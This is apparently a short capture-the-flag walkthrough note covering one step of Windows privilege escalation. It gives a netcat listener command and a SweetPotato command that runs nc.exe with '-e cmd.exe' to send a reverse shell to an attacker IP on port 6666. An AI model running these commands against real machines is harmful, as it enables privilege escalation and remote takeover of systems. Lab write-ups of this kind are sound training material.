With the tools already downloaded to the Windows machine you have to get a reverse shell on your ATTACKING MACHINE.

#Attacking_machine 
- Open a netcat listener.
```
nc -lnvp 6666
```

#Powershell_terminal 
Run the following command to get a reverse shell on the ATTACKING MACHINE terminal. (Write down exactly as below.)
```
.\SweetPotato.exe -p .\nc.exe -a " 10.8.113.198 6666 -e cmd.exe"
```

![[Screenshot from 2025-09-10 11-22-57.png]]

#Attacking_machine 
On the netcat listener you'll get:

![[Screenshot from 2025-09-10 11-25-09 1.png]]


**Next step:** [[Thrid flag]]


